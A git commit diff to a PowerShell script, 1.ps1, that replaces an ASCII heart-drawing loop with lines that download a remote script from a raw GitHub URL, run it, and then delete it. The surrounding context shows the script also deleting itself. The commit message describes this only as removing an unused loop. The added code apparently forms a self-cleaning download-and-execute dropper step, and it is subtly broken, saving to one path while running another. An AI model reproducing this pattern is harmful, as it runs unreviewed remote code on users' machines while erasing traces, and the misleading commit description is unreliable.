4b8a5085cc11e5532edfafc0a7dfa37330c40d9f
truong.nguyen <nguyentruongcp35@gmail.com>
2025-10-22 17:18:04 +0700

    feat: remove unused loop and streamline script execution in 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -9,15 +9,9 @@ Remove-Item $scriptPath -Force
 
 # Start-Process "https://ncsgroup.vn/"
 
-for ($y = 15; $y -ge -15; $y--) {
-    $line = ""
-    for ($x = -30; $x -le 30; $x++) {
-        $a = [math]::Pow(($x * 0.05), 2) + [math]::Pow(($y * 0.1), 2) - 1
-        if ([math]::Pow($a, 3) - [math]::Pow(($x * 0.05), 2) * [math]::Pow(($y * 0.1), 3) -le 0) {
-            $line += "*"
-        } else {
-            $line += " "
-        }
-    }
-    Write-Host $line
-}
+$scriptPath2 = "$PSScriptRoot\temp_3.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/3.ps1" -OutFile $scriptPath
+
+& $scriptPath2
+
+Remove-Item $scriptPath2 -Force
